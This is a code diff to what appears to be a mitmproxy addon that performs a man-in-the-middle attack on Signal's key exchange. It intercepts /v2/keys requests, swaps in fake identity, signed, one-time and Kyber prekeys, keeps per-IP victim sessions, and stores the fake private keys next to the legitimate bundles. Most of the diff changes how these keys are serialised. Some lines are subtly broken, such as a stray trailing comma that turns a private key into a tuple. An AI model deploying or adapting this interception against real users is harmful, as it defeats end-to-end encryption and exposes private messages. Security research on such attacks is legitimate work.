@@ -7,6 +7,8 @@ from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
 import json
 from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
 from base64 import b64decode, b64encode
+
+import utils
 from database import *
 from enum import Enum
 from utils import *
@@ -26,10 +28,7 @@ from server_proto import addons, HOST_HTTPBIN
 from mitm_interface import *
 from collections import defaultdict
 
-registration_info = dict()
-conversation_session = dict()
-bobs_bundle = dict()
-
+# logging.getLogger().addHandler(utils.ColorHandler())
 
 class CiphertextMessageType(Enum):
     WHISPER = 2
@@ -74,10 +73,10 @@ class KeyData():
     fake_SignedPreKeys: Optional[dict] = None
     fake_secret_SignedPreKeys: Optional[dict] = None
 
-    fake_PreKeys: Optional[dict] = None
+    fake_PreKeys: Optional[list[dict]] = None
     fake_secret_PreKeys: Optional[dict] = None
 
-    fake_pq_PreKeys: Optional[dict] = None
+    fake_pq_PreKeys: Optional[list[dict]] = None
     fake_secret_pq_PreKeys: Optional[dict] = None
 
     fake_lastResortKey: Optional[dict] = None
@@ -100,6 +99,10 @@ class BobIdenKey():
     identityKey: Optional[identity_key.IdentityKeyPair] = None
     fake_identityKey: Optional[identity_key.IdentityKeyPair] = None
 
+
+registration_info: dict[str, RegistrationInfo] = dict()
+conversation_session = dict()
+bobs_bundle = dict()
 
 api = addons[0]
 
@@ -248,16 +251,28 @@ def _v2_keys(flow: HTTPFlow):
         lastResortKyber=key_data.pq_lastResortKey
     )
 
+    fake_ik = {
+        "publicKey": b64encode(key_data.fake_IdenKey.public_key().serialize()).decode("utf-8"),
+        "privateKey": b64encode(key_data.fake_IdenKey.private_key().serialize()).decode("utf-8")
+    }
+    fake_spk = key_data.fake_SignedPreKeys
+    fake_spk["privateKey"] = key_data.fake_secret_SignedPreKeys
+    prekeys = utils.json_join_public(key_data.fake_PreKeys, key_data.fake_secret_PreKeys)
+    fake_kyber = utils.json_join_public(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys)
+    fake_last_resort = {
+            "keyId": key_data.fake_lastResortKey["keyId"],
+            "publicKey": key_data.fake_lastResortKey["publicKey"],
+            "privateKey": key_data.fake_secret_lastResortKey
+    }
     mitm_bundle = MitMBundle.insert(
         type=identity,
         aci=registration_info[address].aci,
         deviceId=1,  # todo: shouldnt be static
-        FakeIdenKey=(b64encode(key_data.fake_IdenKey.public_key().serialize()).decode("utf-8"),
-                     b64encode(key_data.fake_IdenKey.private_key().serialize()).decode("utf-8")),
-        FakeSignedPreKey=(key_data.fake_SignedPreKeys, key_data.fake_secret_SignedPreKeys),
-        FakePrekeys=(key_data.fake_PreKeys, key_data.fake_secret_PreKeys),
-        fakeKyberKeys=(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys),
-        fakeLastResortKyber=(key_data.fake_lastResortKey, key_data.fake_secret_lastResortKey)
+        FakeIdenKey=json.dumps(fake_ik),
+        FakeSignedPreKey=json.dumps(fake_spk),
+        FakePrekeys=json.dumps(prekeys),
+        fakeKyberKeys=json.dumps(fake_kyber),
+        fakeLastResortKyber=json.dumps(fake_last_resort)
     )
 
     legit_bundle.on_conflict_replace().execute()
@@ -285,12 +300,15 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         bob_registartion_id = bundle["registrationId"]
 
-        bob_kyber_pre_key_public = b64decode(bundle["pqPreKey"]["publicKey"])
-        bob_kyber_pre_key_signature = b64decode(bundle["pqPreKey"]["signature"] + "==")
-        bob_kyber_pre_key_id = bundle["pqPreKey"]["keyId"]
+        bob_kyber_pre_key = bundle["pqPreKey"]
+        bob_kyber_pre_key_public = b64decode(bob_kyber_pre_key["publicKey"])
+        bob_kyber_pre_key_signature = b64decode(bob_kyber_pre_key["signature"] + "==")
+        bob_kyber_pre_key_id = bob_kyber_pre_key["keyId"]
 
-        bob_signed_pre_key_public = b64decode(bundle["signedPreKey"]["publicKey"])
-        bob_pre_key_public = b64decode(bundle["preKey"]["publicKey"])
+        bob_signed_pre_key = bundle["signedPreKey"]
+        bob_signed_pre_key_public = b64decode(bob_signed_pre_key["publicKey"])
+        bob_pre_key = bundle["preKey"]
+        bob_pre_key_public = b64decode(bob_pre_key["publicKey"])
 
         device_id = bundle["deviceId"]
 
@@ -308,15 +326,19 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
                                                    kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                                                    bob_kyber_pre_key_signature)
 
+        lastResortPq = registration_info[ip_address].aciData if identifier == "aci" else registration_info[ip_address].pniData
+
         legit_bundle = LegitBundle.insert(
             type=identity.lower(),
             aci=uuid,
             deviceId=device_id,
             IdenKey=b64encode(bob_identity_key_public).decode("ascii"),
-            SignedPreKey=b64encode(bob_signed_pre_key_public).decode("ascii"),
-            PreKeys=b64encode(bob_pre_key_public).decode("ascii"),
-            kyberKeys=b64encode(bob_kyber_pre_key_public).decode("ascii"),
-            lastResortKyber=b64encode(bob_kyber_pre_key_public).decode("ascii")
+            SignedPreKey=bob_signed_pre_key,
+            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
+            PreKeys=[bob_pre_key],
+            kyberKeys=[bob_kyber_pre_key],
+            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
+            lastResortKyber=lastResortPq.pq_lastResortKey # need to get from registration_info
         )
         legit_bundle.on_conflict_replace().execute()
         fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, id), bob_bundle)
@@ -369,26 +391,40 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             ]
         }
 
-    mitm_bundle = MitMBundle.insert(
-        type=identity.lower(),
-        aci=uuid,
-        deviceId=device_id,
-        FakeIdenKey=(b64encode(identity_key.public_key().serialize()).decode("utf-8"),
-                     b64encode(identity_key.private_key().serialize()).decode("utf-8")),
-        FakeSignedPreKey=(fakeBundle_wire["devices"][0]["signedPreKey"],
-                          b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")),
-        FakePrekeys=(fakeBundle_wire["devices"][0]["preKey"],
-                     b64encode(fakeUser.pre_key_pair.private_key().serialize()).decode("utf-8")),
-        fakeKyberKeys=(fakeBundle_wire["devices"][0]["pqPreKey"],
-                       b64encode(fakeUser.kyber_pre_key_pair.get_private().serialize()).decode("utf-8")),
-        fakeLastResortKyber=(b64encode(fakeUser.last_resort_kyber.get_public().serialize()).decode(),
-                             b64encode(fakeUser.last_resort_kyber.get_private().serialize()).decode("utf-8"))
-    )
-    mitm_bundle.on_conflict_replace().execute()
+        lastResortPq = {
+            "keyId": 42069,
+            "publicKey": b64encode(fakeUser.last_resort_kyber.get_public().serialize()).decode(),
+            "privateKey": fakeUser.last_resort_kyber.get_private().to_base64(),
+        }
+        fake_ik = {
+            "publicKey": identity_key.public_key().to_base64(),
+            "privateKey": identity_key.private_key().to_base64()
+        }
+        fake_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
+        fake_spk["privateKey"] = b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
+        fake_pre_keys = [{
+                "keyId": fakeBundle_wire["devices"][0]["preKey"]["keyId"],
+                "publicKey": fakeBundle_wire["devices"][0]["preKey"]["publicKey"],
+                "privateKey": fakeUser.pre_key_pair.private_key().to_base64()
+        }]
+        fake_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
+        fake_kyber["privateKey"] = fakeUser.kyber_pre_key_pair.get_private().to_base64()[0],
+        # logging.error()
+        mitm_bundle = MitMBundle.insert(
+            type=identity.lower(),
+            aci=uuid,
+            deviceId=device_id,
+            FakeIdenKey=json.dumps(fake_ik),
+            FakeSignedPreKey=json.dumps(fake_spk),
+            FakePrekeys=json.dumps(fake_pre_keys),
+            fakeKyberKeys=json.dumps([fake_kyber]),
+            fakeLastResortKyber=json.dumps(lastResortPq)
+        )
+        mitm_bundle.on_conflict_replace().execute()
 
     resp.update(fakeBundle_wire)
     conversation_session[(ip_address, identifier)] = (fakeVictim, fakeUser)
-    logging.warn(f"session {conversation_session}")
+    logging.warning(f"session {conversation_session}")
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
 
 
